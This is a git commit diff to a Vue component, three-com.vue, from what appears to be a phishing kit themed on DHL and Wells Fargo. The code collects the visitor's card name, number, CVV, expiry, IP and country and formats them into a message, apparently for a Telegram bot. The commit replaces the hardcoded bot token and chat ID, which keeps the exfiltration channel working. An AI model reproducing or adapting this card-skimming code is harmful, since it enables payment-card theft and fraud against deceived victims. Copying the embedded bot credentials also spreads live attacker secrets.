aee7368ec23f459e99fca3cb4f34743d74191707
estaMan <146589483+estaMan@users.noreply.github.com>
2024-10-24 19:48:22 +0100

    Update three-com.vue

--- src/components/three-com.vue
+++ src/components/three-com.vue
@@ -750,9 +750,9 @@ export default {
       );
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-       var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
+       var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-      var chatId2 = -4219558708;
+      var chatId2 = -4512252331;
       var fullMessage = `
        ||🏦💰💰| Wells |🏦💰💰||%0A%0ACard Name : ${this.cardName}%0ACard Number : ${this.cardNumber}%0ACVV: ${this.cvv}%0AExpiry : ${this.cardDate}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A%0A|💲💲💲|💳| DHL|💳|💲💲💲|`;
 
